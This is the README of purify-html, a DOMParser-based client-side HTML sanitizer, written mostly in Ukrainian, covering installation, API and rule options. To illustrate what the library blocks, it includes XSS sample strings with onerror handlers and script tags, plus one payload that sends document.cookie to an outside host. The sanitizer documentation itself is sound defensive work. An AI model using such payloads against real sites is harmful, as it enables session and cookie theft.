# purify-html

![GitHub file size in bytes](https://img.shields.io/github/size/Aleksandr-JS-Developer/purify-html/dist/index.browser.js?label=CDN%20build%20size&style=flat-square)
![GitHub file size in bytes](https://img.shields.io/github/size/Aleksandr-JS-Developer/purify-html/dist/index.esm.js?label=ESM%20build%20size&style=flat-square)
![GitHub issues](https://img.shields.io/github/issues-raw/Aleksandr-JS-Developer/purify-html?style=flat-square)
![GitHub closed issues](https://img.shields.io/github/issues-closed-raw/Aleksandr-JS-Developer/purify-html?style=flat-square)

Мінімалістична клієнтська бібліотека за для очистки строк для їх безпечного використання як HTML.

Робіть прості речі просто: нульова конфігурація, щоб повністю очистити рядок від HTML, з можливістю поступового налаштування за потреби.

Translations: English (current) | [Ukrainian](/README.ua.md)

[Спробуй! (демо на codesandbox)](https://codesandbox.io/s/purify-html-6ere1w?file=/src/index.js)

Основна ідея полягає у використанні API браузера для аналізу та зміни DOM.
Таким чином досягається відразу кілька цілей:

- Нативний парсер. Бібліотека використовує аналізатор HTML, який використовуватиме браузер для аналізу HTML. Таким чином, не буде ситуації, коли payload буде працювати в браузері, але не працюватиме в парсері, який використовує бібліотека.
- Величезна економія розміру бандлу. Оскільки стандарт HTML досить великий, якісний парсер є досить важкою програмою, без якої можна легко обійтися.
- Швидкість роботи. Парсер всередині DOMParser є нативним, тобто написаний не на JavaScript, а на високопродуктивній мові C++ (наприклад, у v8). Таким чином, аналіз швидший, ніж будь-яка бібліотека JavaScript.
- Високий відсоток підтримки браузера. Хоча DOMParser має широку підтримку, ви можете використовувати polyfill або навіть свій власний парсер. Докладніше див. у [parserSetup](#setparser).

Як наслідок, розбір за допомогою DOMParser надійніший, швидший і не потребує дорогоцінних кілобайтів простору в бандлі.

---

## Встановлення

npm

```bash
npm install purify-html
```

yarn

```bash
yarn add purify-html
```

CDN

```html
<script src="https://cdn.jsdelivr.net/npm/purify-html/dist/index.browser.js"></script>

<!-- чи -->

<script type="module">
  import PurifyHTML from 'https://cdn.jsdelivr.net/npm/purify-html/+esm';
</script>
```

---

## API

```javascript
import PurifyHTML, { setParser } from 'purify-html';

const sanitizer = new PurifyHTML(options);
```

<br>

### function setParser

```javascript
setParser({
  parse(str: string): Element
  stringify(elem: Element): string
}): void
```

<a href="#setParser">Детальніше</a>

<br>

### sanitizer: `object`

#### `sanitize(string): string`

Виконує очищення рядка відповідно до правил, переданих у `options`.

```javascript
import PurifyHTML, { setParser } from 'purify-html';

const sanitizer = new PurifyHTML(options);

const untrustedString = '...';

console.log(sanitizer.sanitize(untrustedString));
```

<br>

#### `toHTMLEntities(string): string`

Coerces a string to HTML entities. Very similar to escaping, but for the HTML interpreter.
In HTML, such characters will be rendered "as is".
See more [here](https://www.w3schools.com/html/html_entities.asp).

Приводить рядок у HTML entities. Дуже схоже на екранування, але для інтерпретатора HTML.
У HTML такі символи відображатимуться «як є».
Дивіться більше [тут](https://www.w3schools.com/html/html_entities.asp).

```javascript
const str = '<br />';

console.log(
  sanitizer.toHTMLEntities(str); // => '&#60;&#98;&#114;&#32;&#47;&#62;', на сторінці буде показано як '<br />'
);
```

---

### options: `Array<string | TagRule>`

Массив правил для санітайзера

```typescript
type AttributeRulePresetName =
  | '%correct-link%'
  | '%http-link%'
  | '%https-link%'
  | '%ftp-link%'
  | '%https-link-without-search-params%'
  | '%http-link-without-search-params%'
  | '%same-origin%';

interface AttributeRule = {
  name: string;
  // Ім'я аттрибута

  value?:
    | string
    | string[]
    | RegExp
    | { preset: AttributeRulePresetName }
    | ((attributeValue: string) => boolean);
  // правила для аттрибута
};

interface TagRule = {
  name: string;
  // ім'я тегу
  attributes: AttributeRule[];
  // правила для аттрибутів
  dontRemoveComments?: boolean;
};
```

```javascript
import PurifyHTML, { setParser } from 'purify-html';

const sanitizer = new PurifyHTML([
  'hr',
  { name: 'br' },
  { name: 'img', attributes: [{ name: 'src' }] },
  {
    name: 'a',
    attributes: [
      { name: 'target', value: ['_blank', '_self', '_parent', '_top'] },
      { name: 'href', value: /^https?:\/\/*/ },
    ],
  },
]);
```

**ПРИМІТКА** Використовуючи регулярні вирази для перевірки ненадійних рядків, не забудьте перевірити свої регулярні вирази на наявність уразливостей ReDoS.
_Успішним використанням уразливості ReDoS є зависання програми під час спроби проаналізувати спеціально створений рядок._ <br>
Детальніше: https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS

## Приклади використання

**використання із збірником:**

```javascript
import PurifyHTML from 'purify-html';

const allowedTags = [
  // тільки строка
  'hr',

  // як об'єкт
  { name: 'br' },

  // перевірка аттрибутів
  { name: 'b', attributes: ['class'] },

  // поглиблена перевірка аттрибутів
  { name: 'p', attributes: [{ name: 'class' }] },

  // перевірка значень аттрибутів (строка)
  { name: 'strong', attributes: [{ name: 'id', value: 'awesome-strong-id' }] },

  // перевірка значень аттрибутів (регулярний вираз)
  { name: 'em', attributes: [{ name: 'id', value: /awesome-em-id?s/ }] },

  // перевірка значень аттрибутів (масив строк)
  {
    name: 'em',
    attributes: [
      { name: 'id', value: ['awesome-strong-id', 'other-awesome-strong-id'] },
    ],
  },

  // перевірка значень аттрибутів (функція)
  {
    name: 'em',
    attributes: [{ name: 'id', value: value => value.startsWith('awesome-') }],
  },

  // use attributes checks preset
  // використовуючи пресет для перевірки аттрибутів
  {
    name: 'a',
    attributes: [{ name: 'href', value: { preset: '%https-link%' } }],
  },
];

const sanitizer = new PurifyHTML(allowedTags);

const dangerString = `
  <script> fetch('google.com', { mode: 'no-cors' }) </script>

  <<div></div>img src="1" onerror="alert(1)">
  <img src="1" onerror="alert(1)">

  <b>Bold</b>
  <b class="red">Bold</b>
  <b class="red" onclick="alert(1)">Bold</b>
  <p data-some="123" data-some-else="321">123</p>
  <div></div>
  <hr>
`;

const safeString = sanitizer.sanitize(dangerString);

console.log(safeString);

/*
  &lt;img src="1" onerror="alert(1)"&gt;
  

  <b>Bold</b>
  <b class="red">Bold</b>
  <b class="red">Bold</b>
  <p data-some="123">123</p>
  
  <hr>
*/
```

[Спробувати](https://codesandbox.io/s/lucid-mclean-6ere1w?file=/src/exampleFromReadme.js).

---

### Використання за допомогою CDN

```html
<!-- ... -->
<head>
  <!-- ... -->
  <script src="https://unpkg.com/purify-html@latest/dist/index.browser.js"></script>
</head>

<!-- ... -->
<script>
  PurifyHTML.setParser(/* ... */);
  const sanitizer = new PurifyHTML.sanitizer(/* ... */);

  sanitizer.sanitize(/* ... */);
</script>
<!-- ... -->
```

Використання для браузера дещо відрізняється від використання зі збірником. Це погано, але це потрібно було зробити, щоб не забивати global scope.

---

## HTML коментарі

### Описання проблеми

Наприклад, рядок: `<!-- <img src="x" onerror="alert(1)"> -->`.

Технічно вставлення його в DOM не призведе до виконання коду, але його також не можна вважати безпечним. Результат методу `sanitize` оголошується дезінфікованим за правилами, визначеними під час ініціалізації дезінфікуючого засобу.

Тому вам надається можливість контролювати, в яких місцях ви будете залишати коментарі, а в яких ні.

### API

По замовчуванню, HTML коментарі видаляються. Ви можете змінити це наступним чином:

```javascript
import PurifyHTML from 'purify-html';

const sanitizer = new PurifyHTML(['#comments' /* ... */]);

sanitizer.sanitize(/* ... */);
```

If you want comments to be removed everywhere except for specific tags, then you can specify it like this:

Якщо ви хочете

```javascript
import PurifyHTML from 'purify-html';

const rules = ['#comments', { name: 'div', dontRemoveComments: true }];
const sanitizer = new PurifyHTML(rules);

sanitizer.sanitize(/* ... */);
```

## setParser

In some cases, you may want to be able to use your parser instead of DOMParser.

This can be done like this:

```javascript
import PurifyHTML, { setParser } from 'purify-html';

setParser({
  parse(HTMLString: string): HTMLElement {
    // ...
  },
  stringify(element: HTMLElement): string {
    // ...
  },
});

const sanitizer = new PurifyHTML();
// ...
```

**Note!** The root element will be passed to the `stringify` function, and the CONTENT of the element will be expected as a result.

```javascript
const input = document.createElement('div');

input.innerHTML = '<span>span</span>';

stringify(input); // '<span>span</span>' => OK
stringify(input); // '<div><span>span</span></div>' => WRONG
```

---

## Why not `document.createElement(...)`

Because by processing the string like this:

```javascript
const parse = str => {
  const node = document.createElement('div');
  div.innerHTML = str;

  return div;
};
```

In fact, this function, having received a special payload, will RUN it. The following payload will send a network request:
`<img/src/onerror="fetch('www.site.com?q='+encodeURI(document.cookie))">`

And in the case of using DOMParser, the code does not run.

---

## Attributes checks preset list

- `%correct-link%` - only currect link
- `%http-link%` - only http link
- `%https-link%` - only https link
- `%ftp-link%` - only ftp link
- `%https-link-without-search-params%` - delete all search params and force https protocol
- `%http-link-without-search-params%` - delete all search params and force https protocol
- `%same-https-origin%` - only link that lead to the same origin that is currently in `self.location.origin`. + force https protocol
- `%same-http-origin%` - only link that lead to the same origin that is currently in `self.location.origin`. + force http protocol

---

## Browser support

Although browser support is already over 97%, the specification for DOMParser is not yet fully established. [More details](https://caniuse.com/mdn-api_domparser_parsefromstring_html).
